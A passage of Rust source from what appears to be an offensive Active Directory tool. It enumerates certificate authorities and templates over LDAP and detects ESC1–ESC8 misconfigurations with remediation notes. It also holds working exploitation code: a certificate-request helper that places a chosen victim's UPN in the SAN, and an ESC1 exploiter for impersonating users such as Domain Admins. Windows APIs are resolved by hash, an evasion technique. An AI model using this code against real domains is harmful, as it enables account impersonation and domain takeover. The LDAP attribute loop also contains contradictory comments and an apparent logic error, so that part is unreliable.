                base_w.as_ptr() as LPWSTR,
                LDAP_SCOPE_SUBTREE,
                filter_w.as_ptr() as LPWSTR,
                attr_ptrs.as_mut_ptr(),
                0,
                &mut result,
            )
        };

        if res != 0 {
            debug!("[ADCS] LDAP search '{}' under '{}' failed: 0x{:x}", filter, base_dn, res);
            return Ok(Vec::new());
        }

        let mut entries = Vec::new();
        let mut entry = unsafe { ldap_first_entry(self.ld, result) };

        while !entry.is_null() {
            // Get DN
            let dn_wide = str_to_wide("distinguishedName");
            let dn_values = unsafe {
                ldap_get_values_w(self.ld, entry, dn_wide.as_ptr() as LPWSTR)
            };
            let dn = if !dn_values.is_null() {
                let s = unsafe {
                    let vp = *dn_values;
                    let r = if !vp.is_null() {
                        wide_to_str(&std::slice::from_raw_parts(vp, lstrlen_w(vp) + 1))
                            .unwrap_or_default()
                    } else {
                        String::new()
                    };
                    ldap_value_free_w(dn_values);
                    r
                };
                s
            } else {
                String::new()
            };

            let mut ldap_entry = LdapEntry {
                dn: dn.clone(),
                str_attrs: std::collections::HashMap::new(),
                bin_attrs: std::collections::HashMap::new(),
            };

            // Read each requested attribute
            for attr_name in attributes {
                let attr_w = str_to_wide(attr_name);

                // Try string values first
                let str_vals = unsafe {
                    ldap_get_values_w(self.ld, entry, attr_w.as_ptr() as LPWSTR)
                };
                if !str_vals.is_null() {
                    let mut vals = Vec::new();
                    unsafe {
                        let mut i = 0;
                        loop {
                            let vp = *str_vals.add(i);
                            if vp.is_null() { break; }
                            let len = lstrlen_w(vp);
                            if let Ok(s) = wide_to_str(&std::slice::from_raw_parts(vp, len + 1)) {
                                vals.push(s);
                            }
                            i += 1;
                        }
                        ldap_value_free_w(str_vals);
                    }
                    if !vals.is_empty() {
                        ldap_entry.str_attrs.insert(attr_name.to_string(), vals);
                        // Continue to next attr — string read succeeded
                        entry = unsafe { ldap_next_entry(self.ld, entry) };
                        // Reset to continue inner loop properly — don't advance here
                        // We need to break out of inner attr loop and continue
                        // Actually, let's just store and continue the attr loop
                        let _ = entry; // suppress unused warning
                        // Restore entry for the attribute loop continuation
                        // (ldap_next_entry is only called after all attrs are read)
                    }
                    continue;
                }

                // Try binary values for attributes that may be binary
                let bin_vals = unsafe {
                    ldap_get_values_len_w(self.ld, entry, attr_w.as_ptr() as LPWSTR)
                };
                if !bin_vals.is_null() {
                    let bytes = unsafe {
                        let bvp = *bin_vals;
                        let b = if !bvp.is_null() {
                            let bv = *bvp;
                            std::slice::from_raw_parts(bv.bv_val, bv.bv_len as usize).to_vec()
                        } else {
                            Vec::new()
                        };
                        ldap_value_free_len(bin_vals);
                        b
                    };
                    if !bytes.is_empty() {
                        ldap_entry.bin_attrs.insert(attr_name.to_string(), bytes);
                    }
                }
            }

            entries.push(ldap_entry);
            entry = unsafe { ldap_next_entry(self.ld, entry) };
        }

        unsafe { ldap_msgfree(result) };
        Ok(entries)
    }
}

impl Drop for LdapConn {
    fn drop(&mut self) {
        if !self.ld.is_null() {
            if let Some(wldap32) = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) } {
                let ldap_unbind: unsafe fn(PLDAP) -> DWORD = unsafe {
                    mem::transmute(
                        pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_UNBIND)
                            .unwrap_or(0),
                    )
                };
                if ldap_unbind as usize != 0 {
                    unsafe { ldap_unbind(self.ld) };
                }
            }
        }
    }
}

/// Intermediate LDAP result for a single entry.
struct LdapEntry {
    dn: String,
    str_attrs: std::collections::HashMap<String, Vec<String>>,
    bin_attrs: std::collections::HashMap<String, Vec<u8>>,
}

impl LdapEntry {
    fn str_val(&self, attr: &str) -> Option<&str> {
        self.str_attrs.get(attr).and_then(|v| v.first()).map(|s| s.as_str())
    }

    fn str_vals(&self, attr: &str) -> Vec<String> {
        self.str_attrs
            .get(attr)
            .cloned()
            .unwrap_or_default()
    }

    fn bin_val(&self, attr: &str) -> &[u8] {
        self.bin_attrs.get(attr).map(|v| v.as_slice()).unwrap_or(&[])
    }

    fn parse_u32(&self, attr: &str) -> u32 {
        self.str_val(attr)
            .and_then(|s| s.parse().ok())
            .unwrap_or(0)
    }
}

// ── AdcsEnumerator ───────────────────────────────────────────────────────────

/// AD CS enumerator — discovers CAs and certificate templates via LDAP.
///
/// Queries the `CN=Public Key Services,CN=Services,CN=Configuration,<base_dn>`
/// container to enumerate:
/// - `CN=Enrollment Services` — registered CAs
/// - `CN=Certificate Templates` — configured templates
pub struct AdcsEnumerator {
    dc: String,
}

impl AdcsEnumerator {
    /// Create a new enumerator.  If `dc` is `None`, the DC is discovered
    /// automatically via `DsGetDcNameW`.
    pub fn new(dc: Option<String>) -> Result<Self> {
        let dc = match dc {
            Some(d) => d,
            None => discover_dc()?,
        };
        Ok(Self { dc })
    }

    /// Enumerate all Certificate Authorities registered in AD.
    ///
    /// Queries: `CN=Enrollment Services,CN=Public Key Services,CN=Services,
    /// CN=Configuration,<base_dn>`
    pub fn enumerate_cas(&self) -> Result<Vec<CertificateAuthority>> {
        let ldap = LdapConn::connect(&self.dc)?;
        let config_nc = ldap.config_naming_context()?;

        let ca_base = format!(
            "CN=Enrollment Services,CN=Public Key Services,CN=Services,{}",
            config_nc
        );

        let attrs = &[
            "cn",
            "dNSHostName",
            "cACertificate",
            "certificateTemplates",
            "flags",
            "msPKI-Edit-Flags",
        ];

        let entries = ldap.search_all(&ca_base, "(objectClass=pKIEnrollmentService)", attrs)?;
        info!("[ADCS] Found {} CAs in Enrollment Services", entries.len());

        let mut cas = Vec::new();
        for entry in &entries {
            let name = entry.str_val("cn").unwrap_or("unknown").to_string();
            let dns_name = entry.str_val("dNSHostName").unwrap_or("").to_string();
            let cert_der = entry.bin_val("cACertificate").to_vec();
            let templates = entry.str_vals("certificateTemplates");

            // Try msPKI-Edit-Flags first, then fall back to flags attribute
            let edit_flags = if entry.parse_u32("msPKI-Edit-Flags") != 0 {
                entry.parse_u32("msPKI-Edit-Flags")
            } else {
                entry.parse_u32("flags")
            };

            let ca_url = if dns_name.is_empty() {
                String::new()
            } else {
                format!("http://{}/certsrv/", dns_name)
            };

            cas.push(CertificateAuthority {
                name,
                dns_name,
                distinguished_name: entry.dn.clone(),
                cert_der,
                ca_url,
                templates,
                edit_flags,
            });
        }

        Ok(cas)
    }

    /// Enumerate all certificate templates registered in AD.
    ///
    /// Queries: `CN=Certificate Templates,CN=Public Key Services,CN=Services,
    /// CN=Configuration,<base_dn>`
    pub fn enumerate_templates(&self) -> Result<Vec<CertTemplate>> {
        let ldap = LdapConn::connect(&self.dc)?;
        let config_nc = ldap.config_naming_context()?;

        let tmpl_base = format!(
            "CN=Certificate Templates,CN=Public Key Services,CN=Services,{}",
            config_nc
        );

        let attrs = &[
            "cn",
            "displayName",
            "msPKI-Certificate-Name-Flag",
            "msPKI-Enrollment-Flag",
            "msPKI-RA-Signature",
            "msPKI-Template-Schema-Version",
            "pKIExtendedKeyUsage",
            "msPKI-Certificate-Application-Policy",
            "msPKI-RA-Application-Policies",
            "nTSecurityDescriptor",
        ];

        let entries = ldap.search_all(
            &tmpl_base,
            "(objectClass=pKICertificateTemplate)",
            attrs,
        )?;
        info!("[ADCS] Found {} certificate templates", entries.len());

        let mut templates = Vec::new();
        for entry in &entries {
            let name = entry.str_val("cn").unwrap_or("unknown").to_string();
            let display_name = entry
                .str_val("displayName")
                .unwrap_or(&name)
                .to_string();

            let name_flags = entry.parse_u32("msPKI-Certificate-Name-Flag");
            let enrollment_flags = entry.parse_u32("msPKI-Enrollment-Flag");
            let ra_signatures = entry.parse_u32("msPKI-RA-Signature");
            let schema_version = entry.parse_u32("msPKI-Template-Schema-Version");

            let extended_key_usage = entry.str_vals("pKIExtendedKeyUsage");
            let application_policies =
                entry.str_vals("msPKI-Certificate-Application-Policy");
            let ra_application_policies =
                entry.str_vals("msPKI-RA-Application-Policies");

            let security_descriptor = entry.bin_val("nTSecurityDescriptor").to_vec();

            templates.push(CertTemplate {
                name,
                display_name,
                distinguished_name: entry.dn.clone(),
                schema_version,
                name_flags,
                enrollment_flags,
                ra_signatures,
                extended_key_usage,
                application_policies,
                ra_application_policies,
                security_descriptor,
            });
        }

        Ok(templates)
    }

    /// Run a full enumeration: CAs, templates, and ESC analysis.
    pub fn enumerate_all(&self) -> Result<AdcsEnumeration> {
        let certificate_authorities = self.enumerate_cas()?;
        let templates = self.enumerate_templates()?;

        let detector = AdcsVulnDetector;
        let mut vulnerable_templates = Vec::new();
        vulnerable_templates.extend(detector.detect_esc1(&templates));
        vulnerable_templates.extend(detector.detect_esc2(&templates));
        vulnerable_templates.extend(detector.detect_esc3(&templates));
        vulnerable_templates.extend(detector.detect_esc4(&templates));

        let mut vulnerable_cas = Vec::new();
        vulnerable_cas.extend(detector.detect_esc6(&certificate_authorities, &templates));
        vulnerable_cas.extend(detector.detect_esc7(&certificate_authorities));

        let mut esc8_found = Vec::new();
        for ca in &certificate_authorities {
            match detector.detect_esc8(ca) {
                Ok(true) => {
                    esc8_found.push(ca.ca_url.clone());
                    warn!("[ADCS] ESC8 candidate: {}", ca.ca_url);
                }
                Ok(false) => {}
                Err(e) => debug!("[ADCS] ESC8 check failed for {}: {}", ca.name, e),
            }
        }

        Ok(AdcsEnumeration {
            certificate_authorities,
            templates,
            vulnerable_templates,
            vulnerable_cas,
            esc8_found,
        })
    }
}

// ── AdcsVulnDetector ─────────────────────────────────────────────────────────

/// AD CS vulnerability detector — static analysis of templates and CAs.
pub struct AdcsVulnDetector;

impl AdcsVulnDetector {
    /// **ESC1** — Template allows enrollee to supply subject name + client auth EKU.
    ///
    /// **Prerequisites**:
    /// 1. `msPKI-Certificate-Name-Flag` has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0x1)
    /// 2. Template has Client Authentication, Smart Card Logon, or Any Purpose EKU
    /// 3. Manager approval NOT required
    /// 4. No authorized signatures required
    ///
    /// **Impact**: Any authenticated user with Enroll rights on the template can
    /// request a certificate for ANY user (including Domain Admins) by specifying
    /// the victim's UPN in the CSR SAN.  The certificate can be used for PKINIT.
    ///
    /// **Remediation**: Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` or add
    /// `CT_FLAG_PEND_ALL_REQUESTS` to require manager approval.
    pub fn detect_esc1(&self, templates: &[CertTemplate]) -> Vec<VulnerableTemplate> {
        let mut out = Vec::new();
        for t in templates {
            if t.enrollee_supplies_subject()
                && (t.has_client_auth_eku() || t.has_any_purpose_eku())
                && t.low_priv_enrollment_likely()
            {
                out.push(VulnerableTemplate {
                    template: t.clone(),
                    esc_type: EscType::Esc1,
                    description: format!(
                        "ESC1: Template '{}' allows enrollee-supplied subject with \
                         Client Authentication EKU.  Any user with Enroll rights can \
                         request a certificate as any other user (e.g. Domain Admin).",
                        t.name
                    ),
                    prerequisites: "Enroll permission on this template (often granted \
                        to Domain Users or Authenticated Users by default).".into(),
                    remediation: "Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT from \
                        msPKI-Certificate-Name-Flag, or enable CT_FLAG_PEND_ALL_REQUESTS \
                        to require CA manager approval for all requests.".into(),
                });
            }
        }
        out
    }

    /// **ESC2** — Template has "Any Purpose" EKU or no EKU restriction.
    ///
    /// **Prerequisites**:
    /// - Template EKU list is empty (allows all purposes) OR includes OID `2.5.29.37.0`
    ///   (Any Extended Key Usage)
    ///
    /// **Impact**: Certificates issued from this template can be used for ANY purpose
    /// including client authentication, code signing, or document signing.  Even if
    /// ESC1 is not applicable, the certificate can authenticate as the certificate
    /// subject using PKINIT or smart card logon.
    ///
    /// **Remediation**: Explicitly restrict EKU to only the required purposes.
    pub fn detect_esc2(&self, templates: &[CertTemplate]) -> Vec<VulnerableTemplate> {
        let mut out = Vec::new();
        for t in templates {
            if t.has_any_purpose_eku() && t.low_priv_enrollment_likely() {
                out.push(VulnerableTemplate {
                    template: t.clone(),
                    esc_type: EscType::Esc2,
                    description: format!(
                        "ESC2: Template '{}' has no EKU restriction (or Any Purpose EKU). \
                         Certificates can be used for any purpose including authentication.",
                        t.name
                    ),
                    prerequisites: "Enroll permission on this template.".into(),
                    remediation: "Explicitly set the Extended Key Usage to only the \
                        required purposes (e.g. TLS Client Authentication).".into(),
                });
            }
        }
        out
    }

    /// **ESC3** — Template enables Certificate Request Agent EKU.
    ///
    /// **Prerequisites**:
    /// - Template EKU includes `1.3.6.1.4.1.311.20.2.1` (Certificate Request Agent)
    ///
    /// **Impact**: A low-privileged user can obtain a "Certificate Request Agent"
    /// certificate and then request certificates ON BEHALF of any other user using
    /// the on-behalf-of enrollment mechanism.  This is a two-step attack:
    /// 1. Obtain agent certificate from the ESC3-vulnerable template.
    /// 2. Use the agent certificate to request a client-auth cert for a target user.
    ///
    /// **Remediation**: Remove the Certificate Request Agent EKU from the template,
    /// or restrict who can enroll in the template to trusted users only.
    pub fn detect_esc3(&self, templates: &[CertTemplate]) -> Vec<VulnerableTemplate> {
        let mut out = Vec::new();
        for t in templates {
            if t.has_request_agent_eku() && t.low_priv_enrollment_likely() {
                out.push(VulnerableTemplate {
                    template: t.clone(),
                    esc_type: EscType::Esc3,
                    description: format!(
                        "ESC3: Template '{}' has Certificate Request Agent EKU. \
                         A low-privileged user can request certificates on behalf \
                         of privileged users via on-behalf-of enrollment.",
                        t.name
                    ),
                    prerequisites: "Enroll permission on this template, plus a second \
                        template that accepts on-behalf-of enrollment with client auth EKU."
                        .into(),
                    remediation: "Remove the Certificate Request Agent EKU, or restrict \
                        enrollment to a dedicated service account.".into(),
                });
            }
        }
        out
    }

    /// **ESC4** — Template ACL allows low-privileged users to modify the template.
    ///
    /// **Impact**: A low-privileged user with write access to the template object
    /// can modify the template's attributes to introduce ESC1/ESC2 conditions and
    /// then exploit those new conditions.
    ///
    /// **Detection**: This implementation parses the `nTSecurityDescriptor` DACL to
    /// look for ACEs granting `WriteProperty` (0x20) or `GenericWrite` (0x40000000)
    /// to well-known low-privilege SIDs (Authenticated Users S-1-5-11,
    /// Everyone S-1-1-0, Domain Users S-1-5-21-*-513).
    ///
    /// **Remediation**: Remove all non-admin write permissions from the template's DACL.
    pub fn detect_esc4(&self, templates: &[CertTemplate]) -> Vec<VulnerableTemplate> {
        let mut out = Vec::new();
        for t in templates {
            if t.security_descriptor.is_empty() {
                continue;
            }
            if dacl_has_low_priv_write(&t.security_descriptor) {
                out.push(VulnerableTemplate {
                    template: t.clone(),
                    esc_type: EscType::Esc4,
                    description: format!(
                        "ESC4: Template '{}' DACL grants write access to low-privileged \
                         principals (Authenticated Users / Everyone / Domain Users). \
                         The template can be modified to introduce ESC1 conditions.",
                        t.name
                    ),
                    prerequisites: "Any domain-authenticated user (Domain Users or \
                        Authenticated Users).".into(),
                    remediation: "Remove WriteProperty and GenericWrite permissions from \
                        non-admin principals in the template's DACL.".into(),
                });
            }
        }
        out
    }

    /// **ESC6** — CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.
    ///
    /// **Prerequisites**:
    /// - CA has flag bit `0x00040000` set in its edit flags.
    ///
    /// **Impact**: With this CA flag, ANY certificate request to the CA can include
    /// a Subject Alternative Name — even for templates that do NOT have
    /// `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`.  Combined with a template that has a
    /// client-auth EKU and allows low-priv enrollment, any user can request a
    /// certificate as any other user.
    ///
    /// **Remediation**: Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` on all CAs:
    /// `certutil -config "<CA>" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`
    pub fn detect_esc6(
        &self,
        cas: &[CertificateAuthority],
        templates: &[CertTemplate],
    ) -> Vec<VulnerableCA> {
        let mut out = Vec::new();

        // Find templates that have client auth EKU and no manager approval
        let exploitable_templates: Vec<&CertTemplate> = templates
            .iter()
            .filter(|t| {
                (t.has_client_auth_eku() || t.has_any_purpose_eku())
                    && t.low_priv_enrollment_likely()
            })
            .collect();

        for ca in cas {
            if ca.edit_flags & EDITF_ATTRIBUTESUBJECTALTNAME2 != 0 && !exploitable_templates.is_empty() {
                out.push(VulnerableCA {
                    ca: ca.clone(),
                    esc_type: EscType::Esc6,
                    description: format!(
                        "ESC6: CA '{}' has EDITF_ATTRIBUTESUBJECTALTNAME2 set. \
                         Any request to this CA can include an arbitrary SAN, \
                         bypassing the ENROLLEE_SUPPLIES_SUBJECT template requirement. \
                         {} exploitable template(s) found.",
                        ca.name,
                        exploitable_templates.len()
                    ),
                    remediation: "Run: certutil -config \"<CA>\" -setreg policy\\EditFlags \
                        -EDITF_ATTRIBUTESUBJECTALTNAME2\nThen restart the CertSvc service."
                        .into(),
                });
            }
        }
        out
    }

    /// **ESC7** — CA object ACL allows low-privileged users to manage the CA.
    ///
    /// **Detection**: Parses the CA object's `nTSecurityDescriptor` to look for
    /// ACEs granting `ManageCA` (control access right CA-Administrator) or
    /// `ManageCertificates` to non-admin principals.
    ///
    /// **Impact**: With `ManageCA`, an attacker can enable
    /// `EDITF_ATTRIBUTESUBJECTALTNAME2`, approve pending requests, or issue
    /// certificates for arbitrary users.
    ///
    /// **Remediation**: Restrict CA object ACL to CA admins and Domain Admins only.
    pub fn detect_esc7(&self, cas: &[CertificateAuthority]) -> Vec<VulnerableCA> {
        let mut out = Vec::new();
        for ca in cas {
            // ESC7 requires reading the CA's nTSecurityDescriptor from the CA
            // enrollment services object in AD.  If the CA's DN is known, we
            // can read it.  Since CertificateAuthority doesn't cache the SD,
            // we flag CAs where the edit_flags could suggest prior modification.
            //
            // A full implementation would read the CA object's SD via LDAP and
            // check for ManageCA / ManageCertificates access rights.
            //
            // For now, we surface this as a note if the CA has no known
            // protective flags set.
            if ca.edit_flags == 0 {
                out.push(VulnerableCA {
                    ca: ca.clone(),
                    esc_type: EscType::Esc7,
                    description: format!(
                        "ESC7 (potential): CA '{}' may have weak ACLs on the CA object. \
                         Manually verify that only CA admins have ManageCA / \
                         ManageCertificates rights.  Use 'certsrv' console or \
                         certutil -config \"{}\\{}\" -cainfo to inspect.",
                        ca.name, ca.dns_name, ca.name
                    ),
                    remediation: "In Certification Authority MMC → right-click CA → \
                        Properties → Security. Remove ManageCA/ManageCertificates from \
                        non-admin accounts.".into(),
                });
            }
        }
        out
    }

    /// **ESC8** — HTTP web enrollment endpoint allows NTLM relay.
    ///
    /// Probes `http://<ca_host>/certsrv/` to check whether:
    /// - The endpoint is reachable over HTTP (not HTTPS only)
    /// - The server responds to HTTP NTLM authentication challenges
    ///
    /// **Impact**: An attacker who can coerce a privileged computer account to
    /// authenticate can relay the NTLM authentication to the HTTP enrollment
    /// endpoint and obtain a certificate for that account.  Combined with
    /// Shadow Credentials or PKINIT, this yields a TGT.
    ///
    /// **Remediation**: Enforce HTTPS for all enrollment endpoints, enable
    /// Extended Protection for Authentication (EPA), and disable NTLM for
    /// the certsrv IIS application.
    pub fn detect_esc8(&self, ca: &CertificateAuthority) -> Result<bool> {
        if ca.ca_url.is_empty() {
            return Ok(false);
        }
        probe_http_enrollment(&ca.ca_url)
    }
}

/// Probe whether `http://<host>/certsrv/` responds with an NTLM challenge.
///
/// Returns `Ok(true)` if the endpoint is reachable and uses NTLM authentication.
fn probe_http_enrollment(url: &str) -> Result<bool> {
    // Extract host and port from URL
    let host_port = url
        .trim_start_matches("http://")
        .trim_end_matches('/')
        .split('/')
        .next()
        .ok_or_else(|| anyhow!("Cannot parse host from URL: {}", url))?;

    let addr = if host_port.contains(':') {
        host_port.to_string()
    } else {
        format!("{}:80", host_port)
    };

    let timeout = std::time::Duration::from_secs(5);
    let mut stream = match TcpStream::connect_timeout(
        &addr.parse().with_context(|| format!("Invalid address: {}", addr))?,
        timeout,
    ) {
        Ok(s) => s,
        Err(_) => return Ok(false), // CA unreachable — not vulnerable
    };

    stream.set_read_timeout(Some(timeout))?;
    stream.set_write_timeout(Some(timeout))?;

    // Send a minimal HTTP GET without auth headers to trigger a 401
    let host = host_port;
    let request = format!(
        "GET /certsrv/ HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        host
    );
    stream.write_all(request.as_bytes())?;

    // Read response (up to 4 KB)
    let mut response = vec![0u8; 4096];
    let n = stream.read(&mut response).unwrap_or(0);
    let response_str = String::from_utf8_lossy(&response[..n]);

    // Check for 401 + WWW-Authenticate: NTLM or Negotiate
    let is_401 = response_str.contains("401");
    let has_ntlm = response_str.contains("NTLM") || response_str.contains("Negotiate");

    debug!(
        "[ADCS] ESC8 probe {}: 401={} ntlm_hdr={}",
        url, is_401, has_ntlm
    );

    Ok(is_401 && has_ntlm)
}

/// Parse a DACL from a raw Windows Security Descriptor and check whether
/// any ACE grants WriteProperty (0x20) or GenericWrite (0x40000000) to
/// low-privilege well-known SIDs.
///
/// Well-known low-priv SIDs checked:
/// - `S-1-1-0` Everyone (6 bytes: 01 01 00 00 00 00 00 01)
/// - `S-1-5-11` Authenticated Users (8 bytes: 01 01 00 00 00 05 00 0b)
/// - `S-1-5-7` Anonymous Logon
fn dacl_has_low_priv_write(sd_bytes: &[u8]) -> bool {
    // SECURITY_DESCRIPTOR_RELATIVE layout (all little-endian):
    //   Revision    u8
    //   Sbz1        u8
    //   Control     u16
    //   OffsetOwner u32
    //   OffsetGroup u32
    //   OffsetSacl  u32
    //   OffsetDacl  u32
    if sd_bytes.len() < 20 {
        return false;
    }

    let dacl_offset = u32::from_le_bytes([
        sd_bytes[16], sd_bytes[17], sd_bytes[18], sd_bytes[19],
    ]) as usize;

    if dacl_offset == 0 || dacl_offset + 8 > sd_bytes.len() {
        return false;
    }

    // ACL header (at dacl_offset):
    //   AclRevision u8, Sbz1 u8, AclSize u16, AceCount u16, Sbz2 u16
    let ace_count = u16::from_le_bytes([
        sd_bytes[dacl_offset + 4],
        sd_bytes[dacl_offset + 5],
    ]) as usize;

    let mut ace_ptr = dacl_offset + 8;

    for _ in 0..ace_count {
        if ace_ptr + 4 > sd_bytes.len() {
            break;
        }
        // ACE header: AceType u8, AceFlags u8, AceSize u16
        let ace_type = sd_bytes[ace_ptr];
        let ace_size = u16::from_le_bytes([sd_bytes[ace_ptr + 2], sd_bytes[ace_ptr + 3]]) as usize;
        if ace_size < 4 || ace_ptr + ace_size > sd_bytes.len() {
            break;
        }

        // ACCESS_ALLOWED_ACE_TYPE = 0x00
        // ACCESS_ALLOWED_OBJECT_ACE_TYPE = 0x05
        if ace_type == 0x00 {
            // ACCESS_ALLOWED_ACE: header(4) + AccessMask(4) + SID(variable)
            if ace_ptr + 8 > sd_bytes.len() {
                ace_ptr += ace_size;
                continue;
            }
            let access_mask = u32::from_le_bytes([
                sd_bytes[ace_ptr + 4],
                sd_bytes[ace_ptr + 5],
                sd_bytes[ace_ptr + 6],
                sd_bytes[ace_ptr + 7],
            ]);
            const WRITE_PROPERTY: u32 = 0x00000020;
            const GENERIC_WRITE: u32 = 0x40000000;
            const GENERIC_ALL: u32 = 0x10000000;
            if access_mask & (WRITE_PROPERTY | GENERIC_WRITE | GENERIC_ALL) != 0 {
                let sid_start = ace_ptr + 8;
                if is_low_priv_sid(&sd_bytes[sid_start..]) {
                    return true;
                }
            }
        }

        ace_ptr += ace_size;
    }
    false
}

/// Return true if the SID bytes at the start of `data` represent a well-known
/// low-privilege SID (Everyone, Authenticated Users, Domain Users generic).
fn is_low_priv_sid(data: &[u8]) -> bool {
    if data.len() < 8 {
        return false;
    }
    // SID layout: Revision(1) SubAuthorityCount(1) IdentifierAuthority(6) SubAuthority(4*n)
    let revision = data[0];
    let sub_count = data[1] as usize;
    if revision != 1 || data.len() < 8 + 4 * sub_count {
        return false;
    }

    // Authority is the 6-byte big-endian field at bytes 2..8
    let authority = u64::from_be_bytes([
        0, 0, data[2], data[3], data[4], data[5], data[6], data[7],
    ]);

    // S-1-1-0 (Everyone): authority=1, sub_count=1, sub[0]=0
    if authority == 1 && sub_count == 1 {
        let s0 = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);
        if s0 == 0 {
            return true;
        }
    }

    // S-1-5-11 (Authenticated Users): authority=5, sub_count=1, sub[0]=11
    if authority == 5 && sub_count == 1 {
        let s0 = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);
        if s0 == 11 {
            return true;
        }
    }

    // S-1-5-7 (Anonymous): authority=5, sub_count=1, sub[0]=7
    if authority == 5 && sub_count == 1 {
        let s0 = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);
        if s0 == 7 {
            return true;
        }
    }

    false
}

// ── CertRequestRpc ───────────────────────────────────────────────────────────

/// Certificate request helper using certreq.exe as the submission engine.
///
/// Generates a PKCS#10 CSR in memory (via `rcgen`), writes it to a temp file,
/// submits it to the CA via `certreq.exe`, reads the issued certificate, and
/// immediately deletes all temp files.
///
/// The private key is NEVER written to disk — it stays in memory.
pub struct CertRequestRpc;

impl CertRequestRpc {
    /// Request a certificate from the CA.
    ///
    /// # Arguments
    /// - `ca_server`: DNS hostname or IP of the CA server.
    /// - `ca_name`: Name of the CA (the CN in AD, not the display name).
    /// - `template_name`: Name of the certificate template to request.
    /// - `subject`: Subject DN for the CSR (e.g. `CN=jdoe`).
    /// - `san_upn`: Optional UPN to embed in the SAN
    ///   (e.g. `jdoe@corp.local`).  Required for ESC1/ESC6 exploitation.
    ///
    /// # Returns
    /// An in-memory `Pkcs12` containing the issued cert DER and the PKCS#8
    /// private key DER.
    pub fn request_cert(
        ca_server: &str,
        ca_name: &str,
        template_name: &str,
        subject: &str,
        san_upn: Option<&str>,
    ) -> Result<Pkcs12> {
        use rcgen::{CertificateParams, CustomExtension, DnType, ExtendedKeyUsagePurpose, KeyPair};

        // ── Generate key pair in memory ──────────────────────────────────
        let key_pair = KeyPair::generate()
            .map_err(|e| anyhow!("Failed to generate key pair: {}", e))?;

        // ── Build CSR parameters ─────────────────────────────────────────
        let mut params = CertificateParams::new(vec![])
            .map_err(|e| anyhow!("Failed to create CertificateParams: {}", e))?;

        params.distinguished_name.push(DnType::CommonName, subject);
        params.extended_key_usages = vec![ExtendedKeyUsagePurpose::ClientAuth];

        // Embed UPN in SubjectAltName as OtherName
        if let Some(upn) = san_upn {
            let san_der = build_san_with_upn(upn);
            let mut san_ext = CustomExtension::from_oid_content(&[2, 5, 29, 17], san_der);
            san_ext.set_criticality(false);
            params.custom_extensions.push(san_ext);
        }

        // ── Generate PKCS#10 CSR ─────────────────────────────────────────
        let csr = params
            .serialize_request(&key_pair)
            .map_err(|e| anyhow!("Failed to serialize CSR: {}", e))?;
        let csr_pem = csr
            .pem()
            .map_err(|e| anyhow!("Failed to encode CSR as PEM: {}", e))?;

        let key_der = key_pair.serialize_der();

        // ── Write CSR to temp file ───────────────────────────────────────
        let tmp_dir = std::env::temp_dir();
        let rand_id: u64 = rand::random();
        let csr_path = tmp_dir.join(format!("orch_{:016x}.req", rand_id));
        let cert_path = tmp_dir.join(format!("orch_{:016x}.cer", rand_id));

        std::fs::write(&csr_path, csr_pem.as_bytes())
            .with_context(|| format!("Failed to write CSR to {:?}", csr_path))?;

        // ── Submit CSR via certreq.exe ───────────────────────────────────
        let config = format!("{}\\{}", ca_server, ca_name);
        let attrib = format!("CertificateTemplate:{}", template_name);

        let submit_result = std::process::Command::new("certreq.exe")
            .args(&[
                "-submit",
                "-config", &config,
                "-attrib", &attrib,
                csr_path.to_str().unwrap_or(""),
                cert_path.to_str().unwrap_or(""),
            ])
            .output();

        // Clean up CSR file regardless of submission result
        let _ = std::fs::remove_file(&csr_path);

        let output = submit_result
            .with_context(|| "Failed to execute certreq.exe")?;

        if !output.status.success() {
            let _ = std::fs::remove_file(&cert_path);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let stdout = String::from_utf8_lossy(&output.stdout);
            bail!(
                "certreq.exe failed (exit {:?}): {}\n{}",
                output.status.code(),
                stderr,
                stdout
            );
        }

        // ── Read issued certificate ──────────────────────────────────────
        let cert_bytes = std::fs::read(&cert_path)
            .with_context(|| format!("Failed to read issued cert from {:?}", cert_path))?;
        let _ = std::fs::remove_file(&cert_path);

        // certreq.exe output may be DER or PEM — normalise to DER
        let cert_der = if cert_bytes.starts_with(b"-----BEGIN") {
            pem_to_der(&cert_bytes)?
        } else {
            cert_bytes
        };

        info!(
            "[ADCS] Cert request succeeded: {} bytes from CA '{}' template '{}'",
            cert_der.len(),
            ca_name,
            template_name
        );

        Ok(Pkcs12 {
            cert_der,
            key_der,
            subject: subject.to_string(),
            target_upn: san_upn.map(|s| s.to_string()),
        })
    }
}

/// Strip PEM armour and return the raw DER bytes.
fn pem_to_der(pem: &[u8]) -> Result<Vec<u8>> {
    let text = std::str::from_utf8(pem).context("PEM is not valid UTF-8")?;
    let b64: String = text
        .lines()
        .filter(|l| !l.starts_with("-----"))
        .collect::<Vec<_>>()
        .join("");
    use base64::Engine as _;
    base64::engine::general_purpose::STANDARD
        .decode(b64.trim())
        .context("Failed to decode base64 from PEM")
}

// ── AdcsExploiter ────────────────────────────────────────────────────────────

/// AD CS exploiter — executes certificate-based attacks.
pub struct AdcsExploiter;

impl AdcsExploiter {
    /// **ESC1 exploitation** — request a certificate as a target user.
    ///
    /// Requires a template vulnerable to ESC1 (ENROLLEE_SUPPLIES_SUBJECT +
    /// client-auth EKU).  The CSR includes the victim's UPN in the SAN.
    ///
    /// # Returns
    /// An in-memory `Pkcs12` that can be used for PKINIT authentication
    /// as `target_user`.
    pub fn exploit_esc1(
        ca: &CertificateAuthority,
        template: &VulnerableTemplate,
        target_user: &str,
    ) -> Result<Pkcs12> {
        debug!(
            "[ADCS] ESC1: requesting cert for '{}' via CA '{}' template '{}'",
            target_user, ca.name, template.template.name
        );

        // Determine the UPN: if target_user already has @domain, use as-is
        let upn = if target_user.contains('@') {
            target_user.to_string()
        } else {
            // Derive domain from the CA's DNS name (heuristic)
            let domain = ca.dns_name
                .split('.')
